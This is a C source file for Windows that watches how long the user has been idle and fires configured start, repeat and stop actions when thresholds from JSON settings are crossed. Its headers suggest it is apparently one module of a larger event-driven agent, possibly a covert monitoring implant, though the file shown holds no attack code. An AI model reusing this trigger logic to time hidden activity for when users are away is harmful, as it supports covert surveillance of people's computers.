#include <Windows.h>
#include <cJSON/cJSON.h>
#include "../common.h"
#include "../bss.h"
#include "../H4-DLL.h"
#include "../SM_Core.h"
#include "../HM_SafeProcedures.h"
#include "../process.h"
#include "../AM_Core.h"
#include "../LOG.h"
#include "../SM_EventHandlers.h"

//---------------------------------------------------
// MONITOR USER IDLE

typedef struct {
	EVENT_PARAM event_param;
	DWORD event_id;
	DWORD threshold;
} monitored_user_idles;

DWORD user_idles_count = 0;
monitored_user_idles* user_idles_table = NULL;
HANDLE em_ui_thread = 0;
BOOL em_ui_cp = FALSE;

DWORD MonitorUserIdles(DWORD dummy)
{
	LASTINPUTINFO lii;
	DWORD last_time = 0;
	DWORD idle = 0;
	DWORD i;

	lii.cbSize = sizeof(lii);
	LOOP{
		Sleep(500);
		CANCELLATION_POINT(em_ui_cp);
		Sleep(500);
		CANCELLATION_POINT(em_ui_cp);

		if (idle < 0xFFFFFFFF)
			idle++;
		// Nuovo input!
		if (GetLastInputInfo(&lii)) {
			if (lii.dwTime != last_time) {
				last_time = lii.dwTime;

				// Esegue l'azione di end per quei threshold che erano scattati
				for (i = 0; i < user_idles_count; i++) {
					if (idle > user_idles_table[i].threshold && user_idles_table[i].threshold > 0) {
						StopRepeatThread(user_idles_table[i].event_id);
						TriggerEvent(user_idles_table[i].event_param.stop_action, user_idles_table[i].event_id);
					}
				}
				idle = 0;
			}
		}

		for (i = 0; i < user_idles_count; i++) {
			// Verifica se alcuni threshold sono scattati
			if (idle == user_idles_table[i].threshold && user_idles_table[i].threshold > 0) {
				TriggerEvent(user_idles_table[i].event_param.start_action, user_idles_table[i].event_id);
				CreateRepeatThread(user_idles_table[i].event_id, user_idles_table[i].event_param.repeat_action, user_idles_table[i].event_param.count, user_idles_table[i].event_param.delay);
			}
		}
	}

		// not reached
	return 0;
}


void WINAPI EM_UserIdlesAdd(cJSON *conf_json, EVENT_PARAM* event_param, DWORD event_id)
{
	void* temp_table;

	if (!(temp_table = realloc(user_idles_table, (user_idles_count + 1) * sizeof(monitored_user_idles))))
		return;

	user_idles_table = (monitored_user_idles*)temp_table;
	memcpy(&user_idles_table[user_idles_count].event_param, event_param, sizeof(EVENT_PARAM));
	user_idles_table[user_idles_count].event_id = event_id;
	user_idles_table[user_idles_count].threshold = cJSON_GetNumberValue(cJSON_GetObjectItem(conf_json, "time"));

	user_idles_count++;
}


void WINAPI EM_UserIdlesStart()
{
	DWORD dummy;

	// Crea il thread solo se ci sono azioni da fare
	if (user_idles_count > 0)
		em_ui_thread = HM_SafeCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)MonitorUserIdles, NULL, 0, &dummy);
}


void WINAPI EM_UserIdlesStop()
{
	QUERY_CANCELLATION(em_ui_thread, em_ui_cp);

	for (DWORD i = 0; i < user_idles_count; i++)
		StopRepeatThread(user_idles_table[i].event_id);

	SAFE_FREE(user_idles_table);
	user_idles_count = 0;
}
